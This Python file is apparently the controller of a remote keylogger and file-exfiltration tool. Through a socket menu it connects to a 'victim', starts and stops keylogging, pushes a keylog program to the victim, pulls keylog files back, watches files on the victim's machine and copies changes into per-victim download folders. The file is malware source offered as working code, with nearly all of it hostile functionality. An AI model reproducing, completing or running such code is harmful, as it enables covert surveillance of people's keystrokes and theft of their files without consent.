import os
import select
import threading
from commander_utils import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                              destination_port)

    # Initialize a Global Thread and Queue (for multipurpose)
    global_thread = None
    signal_queue = queue.Queue()

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                command = get_user_menu_option(sys.stdin)

                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    perform_menu_item_1(connected_clients)

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    perform_menu_item_2(connected_clients)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients)

                # MENU ITEM 4 - Get Keylog File from Victim
                if command == constants.PERFORM_MENU_ITEM_FOUR:
                    perform_menu_item_4(connected_clients)

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

# MENU ITEM 9 - Watch File
                if command == constants.PERFORM_MENU_ITEM_NINE:
                    print(constants.START_WATCH_FILE_MSG)

                    # CASE 1: Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.WATCH_FILE_NO_CLIENTS_ERROR)

                    # CASE 2: Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))

                        # Check if currently keylogging
                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            break

                        # Check if currently watching a file
                        if status_2:
                            print(constants.WATCH_FILE_STATUS_TRUE_ERROR.format(client_ip, client_port))
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            break

                        else:
                            # Send the notification to the victim that commander wants to watch a file
                            client_socket.send(constants.WATCH_FILE_SIGNAL.encode())

                            # Prompt user input + send file path to victim
                            filename = input("[+] Enter the path of the file to watch: ")
                            client_socket.send(filename.encode())

                            # Get Response
                            res = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")

                            # Logic
                            if res[0] == constants.STATUS_TRUE:
                                print(constants.CLIENT_RESPONSE.format(res[1]))
                                print("[+] Now watching file {} from client ({}, {})...".format(filename,
                                                                                                client_ip,
                                                                                                client_port))

                                # Create downloads/victim_ip directory (if necessary)
                                sub_directory_path = make_main_and_sub_directories(client_ip)

                                # a) Update state of socket to is_watching
                                connected_clients[client_socket] = (client_ip, client_port, status, True)

                                # b) Create + Start a thread to monitor client socket and handle modify/deleted files
                                if global_thread is None:
                                    global_thread = threading.Thread(target=watch_file_client_socket,
                                                                     args=(client_socket,
                                                                           signal_queue,
                                                                           filename,
                                                                           sub_directory_path,
                                                                           connected_clients,
                                                                           client_ip,
                                                                           client_port,
                                                                           status),
                                                                     name="Watch_File_Client_Socket")
                                    global_thread.daemon = True
                                    global_thread.start()
                                    print(constants.THREAD_START_MSG.format(global_thread.name))
                            else:
                                print(constants.CLIENT_RESPONSE.format(res[1]))
                                pass

                    # Print closing statements
                    print(constants.RETURN_MAIN_MENU_MSG)
                    print(constants.MENU_CLOSING_BANNER)

# MENU ITEM 10 - Watch Directory
                    # 1) If the file is ADDED (in directories), store it in the
                    #    ip-based directory of commander

# MENU ITEM 11 - Stop Watching File
                if command == constants.PERFORM_MENU_ITEM_ELEVEN:
                    print(constants.STOP_WATCH_FILE_MSG)

                    # CASE 1: Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.STOP_WATCH_FILE_NO_CLIENTS_ERROR)

                    # CASE 2: Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))

                        # Check if currently keylogging
                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            break

                        # Check if currently watching a file
                        if status_2:
                            # a) Stop Thread + Signal to client + Update Status
                            try:
                                if global_thread is not None:
                                    print(constants.THREAD_STOPPING_MSG.format(global_thread.name))
                                    print(constants.STOP_WATCH_FILE_TIP.format(client_ip, client_port))
                                    signal_queue.put(constants.STOP_KEYWORD)

                                    # Wait for thread to finish
                                    global_thread.join()
                                    print(constants.THREAD_STOPPED_MSG)

                                    # Set status to False
                                    connected_clients[client_socket] = (client_ip, client_port, status, False)

                                    # Set global thread to None
                                    global_thread = None

                            except KeyboardInterrupt:
                                # Wait for thread to finish
                                global_thread.join()

                                # Set global thread to None
                                global_thread = None
                                print(constants.KEYBOARD_INTERRUPT_MSG)
                                print("[+] WARNING: You are not allowed to perform any actions on client/victim until "
                                      "they have performed one final event on the file that was currently being watched"
                                      "(i.e. Until this Watch_File_Client_Socket thread has finished...")
                                pass
                        else:
                            print(constants.NOT_WATCHING_FILE_ERROR)

                    # Print closing statements
                    print(constants.RETURN_MAIN_MENU_MSG)
                    print(constants.MENU_CLOSING_BANNER)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_TWELVE:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)

            # #  c) If not from server or stdin sockets, then handle data coming from clients
            # else:
            #     # Data is available to read from an existing client connection
            #     data = sock.recv(constants.BYTE_LIMIT)
            #     if not data:
            #         print("[+] Connection closed by", connected_clients[sock])
            #         del connected_clients[sock]
            #         sockets_to_read.remove(sock)
            #     else:
            #         # print("[+] Received from", connected_clients[sock], ":", data.decode())
            #         # Broadcast the received message to all other connected clients
            #         for client_sock in connected_clients:
            #             if client_sock != sock:
            #                 try:
            #                     client_sock.send(data)
            #                 except Exception as e:
            #                     print("[+] Error broadcasting to", connected_clients[client_sock], ":", str(e))
